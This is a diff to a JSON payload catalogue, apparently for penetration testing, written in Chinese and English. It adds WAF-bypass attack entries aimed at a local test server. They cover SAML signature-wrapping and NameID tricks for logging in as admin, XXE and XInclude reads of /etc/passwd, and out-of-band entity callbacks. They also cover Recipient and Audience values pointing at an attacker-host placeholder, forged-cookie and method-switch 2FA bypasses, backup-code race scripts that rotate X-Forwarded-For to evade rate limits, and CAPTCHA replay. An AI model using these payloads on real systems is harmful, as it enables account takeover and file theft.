+              "command": "sed 's#<samlp:Response #<samlp:Response ><saml:Assertion ID=\"_evil\"><saml:Subject><saml:NameID>admin@example.invalid</saml:NameID></saml:Subject></saml:Assertion>#' fixtures/saml-signed.xml | base64 -w0 | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs",
+              "description": {
+                "zh": "绕过取首个断言的验证器：在已签名断言前插入未签名恶意断言（XSW 经典形态）。成功判据：以 admin 身份建立会话。",
+                "en": "Bypasses verifiers that read the first assertion by prepending an unsigned evil one (classic XSW). Success: session established as admin."
+              }
+            },
+            {
+              "title": {
+                "zh": "签名节点外提",
+                "en": "Signature Hoisting"
+              },
+              "command": "xmlstarlet ed -m \"//*[local-name()='Signature'][1]\" \"//*[local-name()='Response']\" fixtures/saml-signed.xml | base64 -w0 | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs",
+              "description": {
+                "zh": "把断言级签名移动到 Response 级，检验验证器是否校验签名上下文。成功判据：篡改后的断言仍通过验证。",
+                "en": "Hoists the assertion-level signature to the Response level to test context validation. Success: the mutated assertion still verifies."
+              }
+            },
+            {
+              "title": {
+                "zh": "注释断裂引用",
+                "en": "Comment-Broken Reference"
+              },
+              "command": "sed 's#ID=\"_signed_assertion\"#ID=\"_signed_assertion\"<!--x-->#' fixtures/saml-signed.xml | base64 -w0 | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs",
+              "description": {
+                "zh": "在 ID 属性后插入注释节点破坏 URI 引用规范化，检验验证器错误处理。成功判据：签名验证被跳过或断言仍被接受。",
+                "en": "Inserts a comment node after the ID attribute to break URI-reference canonicalization and probe error handling. Success: verification is skipped or the assertion still passes."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "ID=\"_signed_assertion\"",
+                  "explanation": {
+                    "zh": "被引用的 ID",
+                    "en": "Referenced ID attribute"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "<!--x-->",
+                  "explanation": {
+                    "zh": "插入注释节点",
+                    "en": "Inserted comment node"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "base64 -w0",
+                  "explanation": {
+                    "zh": "base64 编码",
+                    "en": "Base64 encodes"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "实体编码 NameID",
+                "en": "Entity-Encoded NameID"
+              },
+              "command": "<!-- comment --><NameID>&#97;dmin@{TARGET}</NameID>",
+              "description": {
+                "zh": "HTML 实体编码绕过 NameID 内容比对与 WAF 特征。成功判据：解码后命中 admin 账户。",
+                "en": "HTML entity encoding bypasses NameID comparison and WAF signatures. Success: decodes to the admin account."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<!-- comment --><NameID>",
+                  "explanation": {
+                    "zh": "注释前缀节点",
+                    "en": "Comment-prefixed node"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "&#97;dmin@{TARGET}",
+                  "explanation": {
+                    "zh": "实体编码用户名",
+                    "en": "Entity-encoded username"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "注释拆分标签",
+                "en": "Comment-Split Tags"
+              },
+              "command": "<Name<!--x-->ID>admin@{TARGET}</NameID>",
+              "description": {
+                "zh": "注释插入标签内部，绕过基于标签结构的过滤且部分解析器仍还原。成功判据：解析后 NameID 值生效。",
+                "en": "Comments inside the tag bypass structure-based filters while some parsers still resolve it. Success: the NameID value takes effect after parsing."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<Name<!--x-->ID>",
+                  "explanation": {
+                    "zh": "标签内部注释",
+                    "en": "Comment inside the tag"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "admin@{TARGET}",
+                  "explanation": {
+                    "zh": "目标管理员值",
+                    "en": "Target admin value"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双断言覆盖",
+                "en": "Dual Assertion Override"
+              },
+              "command": "<saml:Assertion ID=\"_evil\"><saml:Subject><saml:NameID>admin@{TARGET}</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID=\"_signed\">SIGNED_CONTENT</saml:Assertion>",
+              "description": {
+                "zh": "前插未签名断言，验证器取签名断言而应用取首个。成功判据：以 admin 身份登录。",
+                "en": "Prepending an unsigned assertion while the validator reads the signed one and the app reads the first. Success: logged in as admin."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<saml:Assertion ID=\"_evil\">",
+                  "explanation": {
+                    "zh": "未签名首断言",
+                    "en": "Unsigned first assertion"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<saml:Assertion ID=\"_signed\">SIGNED_CONTENT</saml:Assertion>",
+                  "explanation": {
+                    "zh": "已签名后断言",
+                    "en": "Signed later assertion"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "SAML XML签名绕过",
+                "en": "Validation step 1 for SAML Assertion and XML Signature Validation Test"
+              },
+              "command": "<!-- comment --><NameID>admin@{TARGET}</NameID>\n<saml:Assertion ID=\"_evil\"><saml:Subject><saml:NameID>admin@{TARGET}</saml:NameID></saml:Subject></saml:Assertion>\n<ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/>\n<ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n<ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-none\"/>\n<Response><Assertion><Subject><NameID>admin@{TARGET}</NameID></Subject></Assertion></Response>\n<Audience>https://{ATTACKER_HOST}</Audience>\n<Audience>https://{TARGET}.{ATTACKER_HOST}</Audience>\n<SubjectConfirmationData Recipient=\"https://{ATTACKER_HOST}/callback\"/>\n<Conditions NotBefore=\"2000-01-01T00:00:00Z\" NotAfter=\"2099-12-31T23:59:59Z\"/>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+              "description": {
+                "zh": "把签名包装与断言变体逐条置于 SAML 响应验证；服务端接受篡改后的 NameID 或 Audience，即确认断言验证缺陷。",
+                "en": "Place each signature-wrapping or assertion variant into SAML-response validation; the server accepting a tampered NameID or Audience confirms assertion-validation flaws."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<!-- comment --><NameID>admin@{TARGET}</NameID>",
+                  "explanation": {
+                    "zh": "注释混淆 NameID",
+                    "en": "Comment-obfuscated NameID"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<saml:Assertion ID=\"_evil\">",
+                  "explanation": {
+                    "zh": "前插恶意断言",
+                    "en": "Prepended evil assertion"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-none\"/>",
+                  "explanation": {
+                    "zh": "无填充弱签名算法",
+                    "en": "No-padding weak algorithm"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<Audience>https://{ATTACKER_HOST}</Audience>",
+                  "explanation": {
+                    "zh": "改写受众端点",
+                    "en": "Rewritten audience"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+                  "explanation": {
+                    "zh": "XXE 实体注入",
+                    "en": "XXE entity injection"
+                  },
+                  "type": "payload"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1785,10 +4420,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "xmlsec1 --sign --privkey-pem fixtures/test-idp.key,fixtures/test-idp.crt --id-attr:ID Assertion --output signed-test.xml fixtures/saml-signature-template.xml\nxmlsec1 --verify --trusted-pem fixtures/test-idp.crt --id-attr:ID Assertion signed-test.xml"
             },
             {
               "title": {
@@ -1815,8 +4447,8 @@
         {
           "id": "xxe-saml-parser",
           "name": {
-            "zh": "SAML 解析器外部实体边界",
-            "en": "SAML Parser External Entity Boundary"
+            "zh": "SAML XXE 注入",
+            "en": "SAMLResponse XXE Injection"
           },
           "description": {
             "zh": "在 SAMLResponse 中注入外部实体引用，验证 SAML 解析链是否禁用 DTD 与外部实体加载。",
@@ -1847,7 +4479,103 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "参数实体盲注",
+                "en": "Parameter-Entity Blind XXE"
+              },
+              "command": "<?xml version=\"1.0\"?><!DOCTYPE samlp:Response [<!ENTITY % remote SYSTEM \"http://127.0.0.1:18080/PAYLOADER_MARKER\">%remote;]><samlp:Response/>",
+              "description": {
+                "zh": "绕过过滤普通实体（&name;）的规则：参数实体 %remote; 形态在 DTD 内部展开。成功判据：回调端点收到 PAYLOADER_MARKER 请求。",
+                "en": "Bypasses general-entity filters since parameter entities expand inside the internal DTD subset. Success: callback receives the PAYLOADER_MARKER request."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<!ENTITY % remote SYSTEM \"http://127.0.0.1:18080/PAYLOADER_MARKER\">",
+                  "explanation": {
+                    "zh": "参数实体定义",
+                    "en": "Parameter entity declared"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%remote;",
+                  "explanation": {
+                    "zh": "参数实体展开",
+                    "en": "Parameter entity expands"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "DTD 内二次构造",
+                "en": "Nested In-DTD Construction"
+              },
+              "command": "<!DOCTYPE samlp:Response [<!ENTITY % pe \"<!ENTITY exfil SYSTEM 'http://127.0.0.1:18080/PAYLOADER_MARKER'>\">%pe;]><samlp:Response>&exfil;</samlp:Response>",
+              "description": {
+                "zh": "绕过单层实体检测：内部子集里先定义参数实体再展开普通实体。成功判据：外带请求抵达监听端。",
+                "en": "Bypasses single-layer entity detection by defining a parameter entity that constructs a general entity inside the internal subset. Success: out-of-band request reaches the listener."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<!ENTITY % pe \"<!ENTITY exfil SYSTEM 'http://127.0.0.1:18080/PAYLOADER_MARKER'>\">",
+                  "explanation": {
+                    "zh": "参数实体包声明",
+                    "en": "PE wrapping a declaration"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%pe;",
+                  "explanation": {
+                    "zh": "展开参数实体",
+                    "en": "Expands the parameter entity"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "&exfil;",
+                  "explanation": {
+                    "zh": "引用外带实体",
+                    "en": "References the exfil entity"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "XInclude 替代",
+                "en": "XInclude Alternative"
+              },
+              "command": "<samlp:Response xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hostname\"/></samlp:Response>",
+              "description": {
+                "zh": "不依赖 DOCTYPE 声明：XInclude 元素直接触发文件/网络包含。成功判据：响应或回显包含目标文件内容。",
+                "en": "Avoids DOCTYPE-based detection entirely by using XInclude elements for file/network inclusion. Success: response contains the target file content."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<xi:include parse=\"text\" href=\"file:///etc/hostname\"/>",
+                  "explanation": {
+                    "zh": "XInclude 文件包含",
+                    "en": "XInclude file inclusion"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "xmlns:xi=\"http://www.w3.org/2001/XInclude\"",
+                  "explanation": {
+                    "zh": "XInclude 命名空间",
+                    "en": "XInclude namespace"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1945,7 +4673,95 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "大小写与空白差异",
+                "en": "Case & Whitespace Variance"
+              },
+              "command": "xmlstarlet ed -N saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" -u \"//saml:NameID\" -v \" Admin@Example.Invalid \" fixtures/saml-signed.xml",
+              "description": {
+                "zh": "绕过按字面匹配的账户映射：尾随空格与大小写差异经规范化后命中管理员账户。成功判据：映射到 admin 主体。",
+                "en": "Bypasses literal account mapping since trailing spaces and case fold to the admin account after canonicalization. Success: mapped to the admin principal."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "//saml:NameID",
+                  "explanation": {
+                    "zh": "NameID 节点",
+                    "en": "NameID node"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "-v \" Admin@Example.Invalid \"",
+                  "explanation": {
+                    "zh": "空格大小写变体",
+                    "en": "Space and case variant"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Format 属性切换",
+                "en": "Format Attribute Switch"
+              },
+              "command": "xmlstarlet ed -N saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" -u \"//saml:NameID/@Format\" -v \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\" fixtures/saml-signed.xml",
+              "description": {
+                "zh": "变更 NameID 格式触发不同规范化路径。成功判据：unspecified 格式下值被当作另一个账户解析。",
+                "en": "Switching the NameID format triggers a different canonicalization path. Success: the value resolves to a different account under unspecified format."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-u \"//saml:NameID/@Format\"",
+                  "explanation": {
+                    "zh": "改 NameID 格式",
+                    "en": "Updates NameID format"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified",
+                  "explanation": {
+                    "zh": "未指定格式",
+                    "en": "Unspecified format"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "实体编码值",
+                "en": "Entity-Encoded Value"
+              },
+              "command": "xmlstarlet ed -N saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" -u \"//saml:NameID\" -v \"&#97;dmin@example.invalid\" fixtures/saml-signed.xml",
+              "description": {
+                "zh": "HTML 实体编码绕过内容比对与 WAF 特征。成功判据：解码后命中 admin 账户。",
+                "en": "HTML entity encoding bypasses content comparison and WAF signatures. Success: decodes to the admin account."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "&#97;",
+                  "explanation": {
+                    "zh": "编码字符 a",
+                    "en": "Encoded letter a"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "-v \"&#97;dmin@example.invalid\"",
+                  "explanation": {
+                    "zh": "实体编码身份",
+                    "en": "Entity-encoded identity"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2093,7 +4909,119 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "Accept 变换直访",
+                "en": "Direct Access with Accept Variant"
+              },
+              "command": "curl -sS --max-time 5 -H \"Accept: application/json\" -b \"session=PAYLOADER_FIRST_FACTOR_ONLY\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "绕过 HTML 层的中间页跳转：JSON 端点直接暴露受保护资源。成功判据：200 且返回 marker 内容。",
+                "en": "Bypasses HTML interstitial redirects since the JSON endpoint exposes the resource directly. Success: 200 with marker content."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"Accept: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 响应类型",
+                    "en": "JSON accept header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY\"",
+                  "explanation": {
+                    "zh": "携带单因素会话",
+                    "en": "Sends first-factor session"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/marker",
+                  "explanation": {
+                    "zh": "受保护资源",
+                    "en": "Protected resource"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "方法变形访问",
+                "en": "Method-Variant Access"
+              },
+              "command": "curl -sS --max-time 5 -X POST -d \"x=1\" -b \"session=PAYLOADER_FIRST_FACTOR_ONLY\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "利用仅对 GET 强制 2FA 状态的实现差异。成功判据：POST 请求返回受保护内容。",
+                "en": "Exploits implementations that enforce 2FA state on GET only. Success: POST returns protected content."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-X POST",
+                  "explanation": {
+                    "zh": "改用 POST",
+                    "en": "Switches to POST"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "-d \"x=1\"",
+                  "explanation": {
+                    "zh": "任意请求体",
+                    "en": "Arbitrary body"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY\"",
+                  "explanation": {
+                    "zh": "携带单因素会话",
+                    "en": "Sends first-factor session"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "伪造 mfa 标志 Cookie",
+                "en": "Forged mfa Flag Cookie"
+              },
+              "command": "curl -sS --max-time 5 -b \"session=PAYLOADER_FIRST_FACTOR_ONLY; mfa=1; mfa_verified=true\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "叠加常见 mfa 状态 Cookie 名猜测服务端信任的标志。成功判据：任一标志使访问放行。",
+                "en": "Stacks common mfa state cookie names to guess which flag the server trusts. Success: any flag unlocks access."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY; mfa=1; mfa_verified=true\"",
+                  "explanation": {
+                    "zh": "叠加状态 Cookie",
+                    "en": "Stacked state cookies"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "mfa=1",
+                  "explanation": {
+                    "zh": "mfa 标志",
+                    "en": "mfa flag"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "mfa_verified=true",
+                  "explanation": {
+                    "zh": "已验证标志",
+                    "en": "Verified flag"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2177,7 +5105,103 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "字符串数字混淆",
+                "en": "String-Digit Confusion"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"otp\":\"000000\",\"verified\":true}' http://127.0.0.1:8080/verify-2fa",
+              "description": {
+                "zh": "绕过类型校验缺失：字符串形态验证码附加客户端可控 verified 字段。成功判据：服务端跳过真实校验。",
+                "en": "Bypasses missing type validation with a string OTP plus a client-controlled verified flag. Success: server skips real verification."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"otp\":\"000000\",\"verified\":true}",
+                  "explanation": {
+                    "zh": "自证已验证",
+                    "en": "Self-asserted verified"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/verify-2fa",
+                  "explanation": {
+                    "zh": "验证端点",
+                    "en": "Verify endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "数组与嵌套形态",
+                "en": "Array & Nested Forms"
+              },
+              "command": "curl -sS --max-time 5 -d \"otp[]=000000&verified=1\" http://127.0.0.1:8080/verify-2fa",
+              "description": {
+                "zh": "数组化参数绕过标量校验与 WAF 字段特征。成功判据：数组被展开后通过校验。",
+                "en": "Array-shaped parameters bypass scalar validation and WAF field signatures. Success: array is flattened and passes validation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "otp[]=000000",
+                  "explanation": {
+                    "zh": "数组化参数",
+                    "en": "Array-typed param"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "verified=1",
+                  "explanation": {
+                    "zh": "数字真值",
+                    "en": "Numeric true"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Unicode 填充混淆",
+                "en": "Unicode Padding Confusion"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"otp\":\"0\\u00000\"}' http://127.0.0.1:8080/verify-2fa",
+              "description": {
+                "zh": "NUL 与数字的视觉混淆绕过长度与字符集校验。成功判据：非标准输入被接受进入比对。",
+                "en": "NUL/digit visual confusion bypasses length and charset checks. Success: non-standard input reaches comparison."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"otp\":\"0\\u00000\"}",
+                  "explanation": {
+                    "zh": "NUL 混淆值",
+                    "en": "NUL-confused value"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "\\u0000",
+                  "explanation": {
+                    "zh": "JSON NUL 转义",
+                    "en": "JSON NUL escape"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2261,7 +5285,127 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "异步高并发消费",
+                "en": "Async High-Concurrency Consumption"
+              },
+              "command": "python3 - <<'PY'\nimport asyncio, aiohttp\nTARGET=\"http://127.0.0.1:8080/test/verify-backup-code\"\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        rs = await asyncio.gather(*[s.post(TARGET, json={\"code\":\"PAYLOADER_BACKUP_CODE\"}) for _ in range(200)])\n        print(sum(r.status == 200 for r in rs))\nasyncio.run(main())\nPY",
+              "description": {
+                "zh": "绕过恢复码原子消费缺失：异步 200 并发同时命中同一码。成功判据：成功计数大于 1。",
+                "en": "Bypasses non-atomic consumption by racing 200 async requests against one code. Success: success count is greater than 1."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "python3 - <<'PY'",
+                  "explanation": {
+                    "zh": "heredoc 执行脚本",
+                    "en": "Runs an inline Python heredoc"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "aiohttp.ClientSession()",
+                  "explanation": {
+                    "zh": "异步 HTTP 会话",
+                    "en": "Async HTTP session"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "asyncio.gather(",
+                  "explanation": {
+                    "zh": "并发收集请求",
+                    "en": "Gathers concurrent requests"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "sum(r.status == 200 for r in rs)",
+                  "explanation": {
+                    "zh": "统计成功数",
+                    "en": "Counts successes"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "限速规避分散",
+                "en": "Rate-Limit Evasion Spread"
+              },
+              "command": "python3 - <<'PY'\nimport concurrent.futures, itertools, requests\nTARGET=\"http://127.0.0.1:8080/test/verify-backup-code\"\nuas=itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])\ndef hit(i):\n    return requests.post(TARGET, json={\"code\":\"PAYLOADER_BACKUP_CODE\"}, headers={\"User-Agent\":next(uas),\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"}).status_code\nwith concurrent.futures.ThreadPoolExecutor(50) as ex:\n    codes=list(ex.map(hit, range(200)))\nprint(codes.count(200))\nPY",
+              "description": {
+                "zh": "绕过按 IP/UA 的速率限制：轮换 X-Forwarded-For 与 UA 实现并发重放。成功判据：限流未触发且多次成功。",
+                "en": "Bypasses IP/UA-based rate limits by rotating X-Forwarded-For and User-Agent during concurrent replays. Success: no throttle triggers and multiple successes occur."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])",
+                  "explanation": {
+                    "zh": "轮换 UA",
+                    "en": "Rotates user agents"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"",
+                  "explanation": {
+                    "zh": "轮换伪造 XFF",
+                    "en": "Rotates forged XFF"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "ThreadPoolExecutor(50)",
+                  "explanation": {
+                    "zh": "五十线程并发",
+                    "en": "50 worker threads"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "端点变形消费",
+                "en": "Endpoint-Variant Consumption"
+              },
+              "command": "for suffix in \"/\" \".json\" \"/v2\"; do curl -sS --max-time 5 -o /dev/null -w \"%{http_code} $suffix\\n\" -d \"code=PAYLOADER_BACKUP_CODE\" \"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"; done",
+              "description": {
+                "zh": "绕过端点级缓存/锁：路径后缀变形命中同一处理器。成功判据：多形态均成功消费。",
+                "en": "Bypasses per-endpoint caches/locks by suffixing the path while hitting the same handler. Success: multiple forms all consume successfully."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "for suffix in \"/\" \".json\" \"/v2\"",
+                  "explanation": {
+                    "zh": "遍历路径后缀",
+                    "en": "Iterates path suffixes"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "\"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"",
+                  "explanation": {
+                    "zh": "后缀变形端点",
+                    "en": "Endpoint with suffix"
+                  },
+                  "type": "url"
+                },
+                {
+                  "part": "-d \"code=PAYLOADER_BACKUP_CODE\"",
+                  "explanation": {
+                    "zh": "恢复码参数",
+                    "en": "Backup code param"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2357,8 +5501,8 @@
         {
           "id": "auth-captcha-replay",
           "name": {
-            "zh": "CAPTCHA 挑战与会话绑定",
-            "en": "CAPTCHA Challenge and Session Binding"
+            "zh": "CAPTCHA 重放与畸形值绕过",
+            "en": "CAPTCHA Replay & Malformed-Value Bypass"
           },
           "description": {
             "zh": "重复提交已通过验证的 CAPTCHA 会话，验证挑战与单次提交的绑定。",
@@ -2389,7 +5533,245 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "编码变换重放",
+                "en": "Encoded-Mutation Replay"
+              },
+              "command": "curl -sS --max-time 5 -d \"username=payloader&password=PAYLOADER_WRONG&captcha=PAYLOADER%5FTEST%5FCAPTCHA\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过挑战值精确比对：百分号编码下划线后在解码层还原重放。成功判据：同一挑战二次通过。",
+                "en": "Bypasses exact challenge comparison by percent-encoding underscores and replaying after decode. Success: the same challenge passes twice."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "captcha=PAYLOADER%5FTEST%5FCAPTCHA",
+                  "explanation": {
+                    "zh": "编码下划线重放",
+                    "en": "Encoded-underscore replay"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "PAYLOADER%5FTEST%5FCAPTCHA",
+                  "explanation": {
+                    "zh": "编码挑战值",
+                    "en": "Encoded challenge value"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "类型混淆重放",
+                "en": "Type-Confusion Replay"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"username\":\"payloader\",\"password\":\"PAYLOADER_WRONG\",\"captcha\":0}' http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "数字类型进入验证逻辑造成弱比较通过。成功判据：0 值通过校验或跳过校验。",
+                "en": "Numeric types slip through validation via weak comparison. Success: 0 passes or skips validation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "\"captcha\":0",
+                  "explanation": {
+                    "zh": "数字零类型",
+                    "en": "Numeric zero type"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "\"password\":\"PAYLOADER_WRONG\"",
+                  "explanation": {
+                    "zh": "固定错误口令",
+                    "en": "Fixed wrong password"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双参数污染重放",
+                "en": "Duplicate-Parameter Replay"
+              },
+              "command": "curl -sS --max-time 5 -d \"captcha=VALID_CHALLENGE&captcha=REPLAYED_CHALLENGE&username=payloader&password=PAYLOADER_WRONG\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "取参差异使校验与消耗取不同挑战值。成功判据：已消费挑战再次通过。",
+                "en": "Extraction divergence makes validation and consumption read different challenge values. Success: a consumed challenge passes again."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "captcha=VALID_CHALLENGE&captcha=REPLAYED_CHALLENGE",
+                  "explanation": {
+                    "zh": "重复挑战参数",
+                    "en": "Duplicated challenge params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "password=PAYLOADER_WRONG",
+                  "explanation": {
+                    "zh": "固定错误口令",
+                    "en": "Fixed wrong password"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "字段名别名探测",
+                "en": "Field-Name Alias Probing"
+              },
+              "command": "curl -sS --max-time 5 -d \"username=payloader&password=PAYLOADER_WRONG&captcha_code=&cf_captcha_response=\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过固定 captcha 字段名的假设：别名空值命中实现读取的另一个字段。成功判据：空别名导致校验跳过。",
+                "en": "Bypasses fixed captcha field-name assumptions: an empty alias hits another field the implementation reads. Success: empty alias skips validation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "captcha_code=&cf_captcha_response=",
+                  "explanation": {
+                    "zh": "空值别名字段",
+                    "en": "Empty alias fields"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
